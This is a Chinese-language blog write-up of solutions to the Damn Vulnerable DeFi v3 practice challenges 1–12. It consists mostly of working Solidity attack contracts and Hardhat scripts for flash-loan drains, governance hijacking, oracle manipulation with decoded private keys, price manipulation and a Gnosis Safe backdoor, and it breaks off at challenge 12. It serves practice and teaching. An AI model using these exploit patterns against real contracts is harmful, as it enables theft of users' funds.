**区块链安全-Damn-Vulnerable-DeFi**

# 前言
很抱歉，很久没有更新了。这段时间，经历了孩子出生、出国执行项目等诸多事情，心里也比较乱，也没有思绪去完成挑战。最近总算闲下来了，不过打开一看，发现[Damn-Vulnerable-DeFi]已经执行到v3.0.0了，很多东西都发生了变化，为什么不重头做一下呢？不过这次我可能会比较直接，直接贴代码、解释原理把！

# 1. Unstoppable

在**test/unstoppable/unstoppable.challenge.js**中，相关代码如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log(await vault.totalAssets());
        console.log(await vault.totalSupply());
        await token.connect(player).transfer(vault.address,1);
        console.log(await vault.totalAssets());
        console.log(await vault.totalSupply());
    });
```

原因是因为在**UnstoppableVault.sol**中调用`flashLoan`函数，这里有一个先决条件，即`if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`



再看`balanceBefore`就是`totalAssets`即通过`asset.balanceOf(address(this));`查询的到的余额。而`convertToShare(totalSupply)`呢？`totalSupply`来源于`UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626`中的`ERC626`，因为`abstract contract ERC4626 is ERC20`，所以`ERC20`中的`totalSupply`就是我们要找的。



但是，实际的`assets`合约和`Vault`仓库的`token`又不算完全一样。`asset`是资产底层通证，而`share`就是股权通证，在本合约中是1:1兑换的，`share`的增发受严格控制，只能当用户存入`asset`资产底层通证时才能调用`_mint`函数，当用户取出时则会`_burn`。



因为是`convertToShares(totalSupply)`，当资产通证和合约股权通证严格相等时，`totalSupply.mulDivDown(totalSupply, totalAssets())`就会依然等同于`totalAssets()`。但由于股权通证的增发仅由`deposit`函数引起，因此我们直接调用`token.transfer`不会引起股权通证的变化，两者不再相等，从而该等式无法成立。



结果如下：

```
BigNumber { value: "1000000000000000000000000" } -> totalAssets(前)
BigNumber { value: "1000000000000000000000000" } -> totalSupply(前)
BigNumber { value: "1000000000000000000000001" } -> totalAssets(后)
BigNumber { value: "1000000000000000000000000" } -> totalSupply(后)
```

<hr />

# 2. Naive receiver

解决思路：

考虑到在`NaiveReceiverLenderPool`中，采用`FIXED_FEE`，有

```solidity
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
```

也就是说无论怎么样，都必须支付1ether的手续费用。所以我们只要借款10次，就能很轻易的掏空了。



因此，在`test/naive-receiver/naive-receiver.challenge.js`中，关键部分如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        for (i=0; i<10; i++){
            await pool.connect(player).flashLoan(receiver.address,"0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
                1,"0x");
        }
    });
```

注意，因为最后要传入bytes，所以必须加上"0x"，否则不符合格式则会报错。

<hr />

# 3. Truster

解决思路：

考虑到在`TrusterLenderPool.sol`中，闪电贷函数`flashLoan`里有两种类型的地址，`borrower`与`target`，同时还调用了`target`中的`functionCall方法`。我们实际上没有必要去在闪电贷过程中就转移所有通证，只要通过`functionCall`获取后续攻击的权限即可。

因此，在`test/truster/truster.challenge.js`中，关键部分如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const calldata = token.interface.encodeFunctionData(
            "approve",[player.address,TOKENS_IN_POOL]
        );

        await pool.connect(player).flashLoan(0,player.address,token.address,
            calldata);

        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);
    });
```

我们构造了calldata，目的是使得pool作为msg.sender主动调用token合约中的approve，并授权给player所有通证的权限。同时我们用了0个通证的闪电贷并实现了授权，成功掏空了合约中的通证。

<hr />

# 4. Side Entrance

解决思路：

在`SideEntranceLenderPool.sol`中，`SideEntranceLenderPool`既提供了闪电贷功能，又提供了存入功能，这个则是“灾难的”。在闪电贷中，借入和归还都是通过transfer进行的，并没有对相关手段作出特别的校验，最终只会通过`if (address(*this*).balance < balanceBefore)`进行余额上的检查。但如果合约又同时提供了存入、取出却没有进行任何限制，攻击者通过`deposit`也能绕过`flashLoan`的验证，同时还能在之后通过`withdraw`进行提取。



我们需要手写合约，具体如下：

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Hacker{

    SideEntranceLenderPool pool;
    address owner;

    uint constant AMOUNT = 1000 * 10**18;

    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack() public{
        pool.flashLoan(AMOUNT);
    }

    function execute() public payable{
        pool.deposit{value:msg.value}();
    }

    function withdraw() public {
        pool.withdraw();
    }

    receive() external payable {
        payable(owner).transfer(msg.value);
    }

}
```

在`test/side-entrance/side-entrance.challenge.js`中，具体代码如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const hacker = await (await ethers.getContractFactory('Hacker', player)).deploy(pool.address);
        await hacker.attack();
        await hacker.withdraw();
    });
```

<hr />

# 5.The Rewarder

解决思路：

首先要弄明白，这个快照的是如何实现的。

`AccountingToken`的介绍是`A limited pseudo-ERC20 token to keep track of deposits and withdrawals with snapshotting capabilities`，这是通过继承`ERC20Snapshot`实现的。

后者定义了一个结构

```solidity
    struct Snapshots {
        uint256[] ids;
        uint256[] values;
    }
```

并通过`    mapping(address => Snapshots) private _accountBalanceSnapshots;`去存储余额，在每次操作时，都会通过`_updateAccountSnapshot`和`_updateTotalSupplySnapshot`去更新对应快照id下的余额。

而这个又是如何触发分红的呢，为什么不直接按照余额来？

`TheRewarderPool`触发分红是通过`distributeRewards`进行（注意是在`mint`后进行），当满足`isNewRewardsRound`（可开展新一轮分红后），就根据余额进行分红。

我们的思路就是通过闪电贷，触发分红（要在相关时间后第一个发起交易），随后取出并归还。

我们需要手写合约，具体如下（为简便起见，不导入，直接用abi.encodeWithSignature）：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract HackerRewarder {

    using Address for address;


    address pool;
    address flashLoan;
    address token;
    address reward;
    address owner;

    constructor(address _pool,address _flashLoan, address _token, address _reward ) {
        pool = _pool;
        flashLoan = _flashLoan;
        token = _token;
        reward = _reward;
        owner = msg.sender;
    }

    function attack(uint amount) external {
        flashLoan.functionCall(abi.encodeWithSignature("flashLoan(uint256)", amount));
    }

    function receiveFlashLoan(uint256 amount) external {
        token.functionCall(abi.encodeWithSignature("approve(address,uint256)",pool,amount));
        pool.functionCall(abi.encodeWithSignature("deposit(uint256)", amount));
        pool.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
        token.functionCall(abi.encodeWithSignature("transfer(address,uint256)",flashLoan,amount));
        reward.functionCall(abi.encodeWithSignature("approve(address,uint256)",owner,100 ether));
    }
}
```

在`test/the-rewarder/the-rewarder.challenge.js`中，具体代码如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const hacker = await ethers.getContractFactory('HackerRewarder', player);
        const hackerRewarder = await hacker.deploy(rewarderPool.address,
                                                   flashLoanPool.address,
                                                   liquidityToken.address,
                                                   rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await hackerRewarder.connect(player).attack(TOKENS_IN_LENDER_POOL);
        const hackedReward = await rewardToken.balanceOf(hackerRewarder.address);
        await rewardToken.connect(player).transferFrom(hackerRewarder.address,player.address,hackedReward);
    });
```

其中，要记得通过`evm_increaseTime`将时间调整5天以达成分红的条件！

<hr />

# 6. Selfie

解决思路：

首先我们要看一下攻击的入口很明显是`SelfiePool.sol`中的`emergencyExit`，但有一个`onlyGovernance`的限制。

我们看治理合约里，可以提出提案`queueAction`，但前提是`_hasEnoughVotes(msg.sender)`，然而之后`2 days`后，执行通过的合约就不需要再次校验了！

所以我们可以利用闪电贷发起提案，2天后执行就好！

我们需要手写合约，具体如下（为简便起见，不导入，直接用abi.encodeWithSignature）：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract HackerSelfie {

    using Address for address;

    address flashLoan;
    address govern;
    address token;
    address owner;
    uint256 public requestId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");


    constructor(address _flashLoan,address _govern, address _token){
        flashLoan = _flashLoan;
        govern = _govern;
        token = _token;
        owner = msg.sender;
    }

    function attack(uint256 amount) public{
        flashLoan.functionCall(abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)",
            address(this),token,amount,""));
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        token.functionCall(abi.encodeWithSignature("snapshot()"));
        bytes memory response = govern.functionCall(abi.encodeWithSignature(
            "queueAction(address,uint128,bytes)", 
            flashLoan,0,abi.encodeWithSignature("emergencyExit(address)", owner)));
        requestId = abi.decode(response,(uint256));
        token.functionCall(abi.encodeWithSignature("approve(address,uint256)",flashLoan,amount+fee));
        return CALLBACK_SUCCESS;
    }

}
```

此处注意，为了保证，手动对`token`进行了快照！

在`test/the-rewarder/the-rewarder.challenge.js`中，具体代码如下：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const hacker =  await (await ethers.getContractFactory('HackerSelfie', player)).deploy(pool.address,
                                                                                                governance.address,
                                                                                                token.address);
        await hacker.connect(player).attack(await pool.maxFlashLoan(token.address));
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await governance.executeAction(await hacker.requestId());

    });
```

<hr />

# 7. Compromised

解决思路：

涉及到“喂价”，一定就回到了操纵预言机攻击。那我们来看看捕捉到的信息：

`4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`，两个16进制（1 byte => 8位）对应ASCII码。

解析为ASCII，为`MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5`，很明显这个是`base64`加密后的结果，解密为`0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9`。

同样，我们还可以获得`0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48`。

我们使用如下代码进行验证：

```javascript
const priKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
const priKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
const oracle1 = new ethers.Wallet(priKey1);
const oracle2 = new ethers.Wallet(priKey2);
console.log(oracle1.address);
console.log(oracle2.address);
```

输出结果如下：

```
0xe92401A4d3af5E446d93D11EEc806b1462b39D15
0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

而这个正好就是喂价机的地址。接下来就是通过操纵预言机进行获利了。由合约`Exchange.sol`可知，`buyOne`和`SellOne`都依赖于`getMedianPrice`，即通过中位数定价。

```javascript
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const priKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const priKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        const oracle1 = new ethers.Wallet(priKey1,ethers.provider);
        const oracle2 = new ethers.Wallet(priKey2,ethers.provider);
        console.log(oracle1.address);
        console.log(oracle2.address);
        
        const tx1 = {
            to: oracle1.address,
            value: ethers.utils.parseEther('0.02'),
            gasLimit: 21000,
            gasPrice: ethers.utils.parseUnits('10', 'gwei'),
          };
        const tx2 = {
            to: oracle2.address,
            value: ethers.utils.parseEther('0.02'),
            gasLimit: 21000,
            gasPrice: ethers.utils.parseUnits('10', 'gwei'),
          };         
        await player.sendTransaction(tx1);
        await player.sendTransaction(tx2);

        await oracle.connect(oracle1).postPrice('DVNFT',ethers.utils.parseEther('0.0001'));
        await oracle.connect(oracle2).postPrice('DVNFT',ethers.utils.parseEther('0.0001'));
        const id = await exchange.connect(player).callStatic.buyOne({value:ethers.utils.parseEther('0.0001')});
        await exchange.connect(player).buyOne({value:ethers.utils.parseEther('0.0001')});
        

        const price = await ethers.provider.getBalance(exchange.address);
        await oracle.connect(oracle1).postPrice('DVNFT',price);
        await oracle.connect(oracle2).postPrice('DVNFT',price);
        await nftToken.connect(player).approve(exchange.address,id);
        await exchange.connect(player).sellOne(id);

        await oracle.connect(oracle1).postPrice('DVNFT',INITIAL_NFT_PRICE);
        await oracle.connect(oracle2).postPrice('DVNFT',INITIAL_NFT_PRICE);

    });
```

注意以下几点：

1. 提前给预言机器oracle1、oracle2转账
2. 通过callStatic模拟执行结果，提前获取id

   或者使用

   ```javascript
   const tx3 = await exchange.connect(player).buyOne({value:ethers.utils.parseEther('0.0001')});
   const receipt = await tx3.wait();
   const id =await receipt.events[1].args.tokenId;
   ```
3. 结束以后将价格改回来

<hr />

# 8. Puppet

解决思路：

要通过质押取出所有的通证，结果很简单，就是先“砸盘”，再存入并借款（通常情况下，又需要买回原来的“砸盘”保证筹码不失）。

如果仅由分步进行:

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await token.connect(player).approve(uniswapExchange.address,PLAYER_INITIAL_TOKEN_BALANCE);
        await uniswapExchange.connect(player).tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
        );
        const valueDeposit = await lendingPool.callStatic.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE,player.address,{value:valueDeposit});
        await uniswapExchange.connect(player).ethToTokenSwapOutput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            (await ethers.provider.getBlock('latest')).timestamp * 3,   // deadline
            {value : UNISWAP_INITIAL_ETH_RESERVE + 1n}
        );
        
    });
```

然而，这不满足要求`        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);`

将攻击分成好几步，一次一次来，是不是觉得MEV看不到？所以这里还需要将以上步骤都打包，通过合约进行，并在合约创建过程中完成。这里就有一个问题了：`approve`操作该怎么办，能一步完成吗？

查询了一下所用的ERC20，里面多了一个函数`permit`:

```solidity
    /*//////////////////////////////////////////////////////////////
                             EIP-2612 LOGIC
    //////////////////////////////////////////////////////////////*/

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");

        // Unchecked because the only math done is incrementing
        // the owner's nonce which cannot realistically overflow.
        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256(
                                    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
                                ),
                                owner,
                                spender,
                                value,
                                nonces[owner]++,
                                deadline
                            )
                        )
                    )
                ),
                v,
                r,
                s
            );

            require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");

            allowance[recoveredAddress][spender] = value;
        }

        emit Approval(owner, spender, value);
```

通过组合检查用户签名等同于`Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)...`可以实现代授权功能，这个感觉有点危险。。

那就写攻击合约吧:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

contract HackerPuppet {

    using Address for address;

    constructor(address token,
                address pool,
                address swap,
                uint8 v, bytes32 r, bytes32 s,
                uint256 playerToken,
                uint256 poolToken) payable {
        token.functionCall(abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,r,s
        ));
        token.functionCall(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            playerToken
        ));

        bytes memory ans = token.functionCall(abi.encodeWithSignature(
            "balanceOf(address)",
            address(this)
        ));
        console.log("after transfering...");
        console.log(abi.decode(ans,(uint256)));


        console.log("before swapping");
        console.log(address(this).balance);

        token.functionCall(abi.encodeWithSignature(
            "approve(address,uint256)",
            swap,
            playerToken
        ));

        swap.call(
            abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)", 
            playerToken,
            1,
            type(uint256).max
            )
        );

        console.log("after swapping");
        console.log(address(this).balance);


        (bool suc, bytes memory response) = pool.staticcall(abi.encodeWithSignature(
            "calculateDepositRequired(uint256)", 
            poolToken));
        console.log(suc);
        
        uint256 requiredETH = abi.decode(response,(uint256));
        console.log("requiredETH");
        console.log(requiredETH);

        pool.functionCallWithValue(
            abi.encodeWithSignature
                ("borrow(uint256,address)", poolToken, msg.sender)
            ,
            requiredETH);
        
        swap.functionCallWithValue(
            abi.encodeWithSignature(
                "ethToTokenSwapOutput(uint256,uint256)", 
                playerToken,
                type(uint256).max
            ),
            10 ether + 1
        );
        
        token.functionCall(abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            playerToken
        ));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {

    }

}
```

我们逐步来解析，以下通过permit完成在合约中的代授权并转账（其实我觉得在攻击时，这一步能拆开）

```solidity
        token.functionCall(abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,r,s
        ));
        token.functionCall(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            playerToken
        ));
```

以下approve完成通证授权给swap，并通过swap实现“砸盘”

```solidity
		token.functionCall(abi.encodeWithSignature(
            "approve(address,uint256)",
            swap,
            playerToken
        ));

		swap.call(
            abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)", 
            playerToken,
            1,
            type(uint256).max
            )
        );
```

以下则通过质押进行borrow，并在同一笔交易内将“砸盘”的筹码买回！

```solidity
 		(bool suc, bytes memory response) = pool.staticcall(abi.encodeWithSignature(
            "calculateDepositRequired(uint256)", 
            poolToken));
        console.log(suc);
        
    	uint256 requiredETH = abi.decode(response,(uint256));
    	console.log("requiredETH");
    	console.log(requiredETH);

    	pool.functionCallWithValue(
            abi.encodeWithSignature
                ("borrow(uint256,address)", poolToken, msg.sender)
            ,
            requiredETH);
        
        swap.functionCallWithValue(
            abi.encodeWithSignature(
                "ethToTokenSwapOutput(uint256,uint256)", 
                playerToken,
                type(uint256).max
            ),
            10 ether + 1
        );
```

合约创建如`test/puppet/puppet.challenge.js`，先通过`getContractAddress`实现合约地址预先计算以实现签名，然后通过部署完成攻击！

```javascript
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        const hacker = ethers.utils.getContractAddress({
            from: player.address,
            nonce: 0 
        });

        console.log("hackerAddress : " + hacker);
        console.log("swap : " + uniswapExchange.address);

        const { r, s, v } = await signERC2612Permit(
            ethers.provider,
            token.address,
            player.address,
            hacker,
        );

        await (await ethers.getContractFactory('HackerPuppet', player)).deploy(
            token.address,
            lendingPool.address,
            uniswapExchange.address,
            v,r,s,
            PLAYER_INITIAL_TOKEN_BALANCE,
            POOL_INITIAL_TOKEN_BALANCE,
            {value: 200n * 10n ** 17n,  gasLimit: '30000000',
        });

        console.log(await token.balanceOf(hacker));
    });

```

<hr />

# 9. Puppet - V2

解决思路：

这里是Uniswap V2，与之前的区别在于使用了`UniswapRouter`进行了中继，所以我们不会再直接与`pair`进行交互，而是依靠`Router`。

思路还是一样的，先将`token`转变为`weth`，并将`eth`转变为`weth`以完成质押存入`mint weth`（否则数量不够）。这一题反而没有单笔交易内完成的相关限制，有点奇怪。

具体代码如下：

```javascript
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await token.connect(player).approve(uniswapRouter.address,PLAYER_INITIAL_TOKEN_BALANCE);
        console.log("before swapping, token : "+await token.balanceOf(player.address));
        console.log("before swapping, weth : "+await weth.balanceOf(player.address));
        await uniswapRouter.connect(player).swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            [
                token.address,
                weth.address
            ],
            player.address,
            (await ethers.provider.getBlock('latest')).timestamp * 3,
        );
        console.log("after swapping, token : "+await token.balanceOf(player.address));
        console.log("after swapping, weth : "+await weth.balanceOf(player.address));
        const stakeAmount = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        const beforeDeposit = await weth.balanceOf(player.address);
        const valueToDeposit = BigNumber(stakeAmount - beforeDeposit);

        await weth.connect(player).deposit({value : valueToDeposit.toString()});
        console.log("current : "+ await weth.balanceOf(player.address));
        await weth.connect(player).approve(lendingPool.address,stakeAmount);
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```

<hr />

# 10. Free Rider

解决思路：

进入点类似于**重入攻击**，只要凑齐`15`ETH，就可以通过`buyMany`的漏洞批量完成了。然而我们起始只有0.1个，该怎么办？这也呼应了题目中的`If only you could get free ETH, at least for an instant. `

一开始疑惑了好一会，突然明白了，因为部署了`Uniswap V2`，所以我们可以利用`FlashLoan（Flash Swap）`实现一次性攻击。

其实这里面漏洞有两个:

1. msg.value可重入 批量购买
2. 将购买金额发送给nft所有者是在变更所有权后

以下是攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

contract HackerFreeRider is IERC721Receiver{
    using Address for address;

    // borrow eth
    uint256 borrowAmount = 15 ether;

    address pair;
    address weth;
    address exchange;
    address nft;
    address reward;
    address owner;

    constructor(address _pair,
                address _weth,
                address _exchange,
                address _nft,
                address _reward
                ){
        pair = _pair;
        weth = _weth;
        exchange = _exchange;
        nft = _nft;
        reward = _reward;
        owner = msg.sender;
    }

    function attack() public {
        pair.functionCall(
            abi.encodeWithSignature(
                "swap(uint256,uint256,address,bytes)",
                borrowAmount,
                0,
                address(this),
                "1"
                ));

    }

    function uniswapV2Call(address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data) public{

        console.log("calling back");

        bytes memory wethBorrowed = weth.functionCall(
            abi.encodeWithSignature(
                "balanceOf(address)",
                address(this)
            )
        );

        console.log(
            abi.decode(wethBorrowed,(uint256))
        );
        console.log("successfully borrowed ...");

        weth.functionCall(
            abi.encodeWithSignature(
                "withdraw(uint256)",
                abi.decode(wethBorrowed,(uint256))
            )
        );

        console.log(address(this).balance);


        uint[] memory arr = new uint[](6);
        for (uint i = 0; i<6; i++){
            arr[i] = i;
        }

        exchange.functionCallWithValue(
            abi.encodeWithSignature(
                "buyMany(uint256[])", 
                arr),
            abi.decode(wethBorrowed,(uint256))
        );

        for (uint i = 0; i < 6; i++){
            nft.functionCall(
                abi.encodeWithSignature(
                    "safeTransferFrom(address,address,uint256,bytes)",
                    address(this),
                    reward,
                    i,
                    abi.encode(address(this))
                )
            );
        }

        console.log("eth ", address(this).balance);
        uint mintback = borrowAmount * 1000 / 997 + 1 ether;
        weth.functionCallWithValue(
            abi.encodeWithSignature(
                "deposit()"
            ),
            mintback
        );
        console.log("after mint back ");
        console.log("eth ", address(this).balance);

        weth.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                pair,
                mintback
            )
        );

        payable(owner).transfer(address(this).balance);
        console.log("finish...");
    }


    receive() payable external {
        console.log("receiving ...");
        console.log(msg.value);
        console.log(address(this).balance);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
     {
        console.log("receving : ", _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }


}
```



在`attack`函数中，调用

```solidity
        pair.functionCall(
            abi.encodeWithSignature(
                "swap(uint256,uint256,address,bytes)",
                borrowAmount,
                0,
                address(this),
                "1"
                ));
```

通过`uniswapV2Call`接受回调，实现转为ETH，购买NFT，获取奖励，铸造WETH，归还闪电贷。同时记得要实现`onERC721Received`以接受NFT。

在`test/free-rider/free-rider.challenge.js`中，代码如下：

```javascript
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        hacker = await (await ethers.getContractFactory('HackerFreeRider', player)).deploy(
            uniswapPair.address,
            weth.address,
            marketplace.address,
            nft.address,
            devsContract.address
            );
        hacker.connect(player).attack();

    });
```

<hr />

# 11. Backdoor

首先：Gnosis Safe是一个开源的多签名钱包，旨在为用户提供更高的安全性和更好的用户体验。它允许用户管理数字资产，并使用多重签名保护其资产。这介绍了相关背景。

因为一开始做就了限制：

`msg.sender != walletFactory`所以我们还是要先与walletProxyFactory进行交互，所以我们看看有哪些利用点。

观察`createProxyWithCallback`调用了`createProxyWithNonce`，同时执行以下：

```solidity
            assembly {
                if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                    revert(0, 0)
                }
            }
```

这会调用`proxy`的`fallback`函数，最终通过delegateCall执行calldata中的逻辑。

```solidity
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
```

在这里，又由于限制，我们可以直接将`singleton`指向攻击函数，并在这里执行操作，由于**调用发生在之前**，所以我们可以预先通过`approve`等方法完成预先授权。但由于需要调用`Setup`完成对钱包的设置，所以我们将调用`approve`的操作`delegate`放在`setup`的`data`变量中，最终会在`setupModule`中通过` require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");`执行。所以我们传入的`initializer`应该是`setup`经过decode后的结果。

先写攻击合约，这里有一个大坑。。（我一开始将`    function delegateApprove(address token, address spender) external`写在HackerBackDoor合约内，但是因为还是在创建阶段，所以无法调用。所以后来我写在一个子合约内）。因为每次`owner`只能有一个人，所以我们被迫通过循环实现。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";


contract CB{

    constructor(){
    
    }

    function delegateApprove(address token, address spender) external{
        console.log("delegate coming in");
        token.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                spender,
                type(uint256).max - 1
            )
        );
    }

}

contract HackerBackdoor {
    using Address for address;
    address placeholder1;
    address placeholder2;
    IERC20 tokenDVT;


    constructor(
        address[] memory users,
        address factory,
        address token,
        address wallet,
        address singleton
    ){
        tokenDVT = IERC20(token);
        CB cb = new CB();

        GnosisSafeProxyFactory fac = GnosisSafeProxyFactory(factory);

        console.log("performing attack by ",address(this));

        for (uint i = 0; i < users.length; i++){
            console.log("user ",users[i]);

            address[] memory user2call = new address[](1);
            user2call[0] = users[i];

            bytes memory tmp = abi.encodeWithSignature(
                    "delegateApprove(address,address)",
                    token,
                    address(this)
            );

            bytes memory data = 
                abi.encodeWithSignature(
                    "setup(address[],uint256,address,bytes,address,address,uint256,address)"
                    ,
                    user2call,
                    1, // threshold
                    cb,
                    tmp,
                    address(0),
                    address(0),
                    0,
                    address(0)
                );

            GnosisSafeProxy proxyAddr = fac.createProxyWithCallback(
                singleton, data, 0, IProxyCreationCallback(wallet));

            console.log("proxy ", address(proxyAddr));

            console.log("dvt balance ",tokenDVT.balanceOf(address(proxyAddr)));
            tokenDVT.transferFrom(
                address(proxyAddr), msg.sender, 10 ether);

        }
    }

}
```

根据以上原理，见`test/backdoor/backdoor.challenge.js`，我们成功在一笔交易内完成获取。

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const hacker = await (await ethers.getContractFactory('HackerBackdoor', player)).deploy(
            users,
            walletFactory.address,
            token.address,
            walletRegistry.address,
            masterCopy.address,
            {gasLimit: '30000000'}
        );
    });
```

PS. 我发现调试时尽量通过interface导入后调用，之前是为了合约的简洁（如果思路清晰的话没问题）。

<hr />

# 12. Climber

解决思路：

在`ClimberTimeLock`的`execute`函数中，由于先执行操作，然后再通过`getOperationState(id) != OperationState.ReadyForExecution`校验，形成了典型的“先上车后买票”的进入点。

但由于我们执行时，得一步一步执行，因为执行时`msg.sender`就是`ClimberTimeLock`本身。我们会从`Admin_ROLE`开始，逐步提权。

我们首先列出需要做的事情：

1. updateDelay 改为 0
2. 分配给特定角色`PROPOSER_ROLE`以能够实现提案
3. 实现升级以取消相关限制
4. 完成提款
5. 提交提案



所以我们先写出来攻击的合约吧，需要在同一笔交易内完成（创建合约可以提前）。

升级合约本身没什么特别的，就是在原先基础上去掉了一些限制：

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

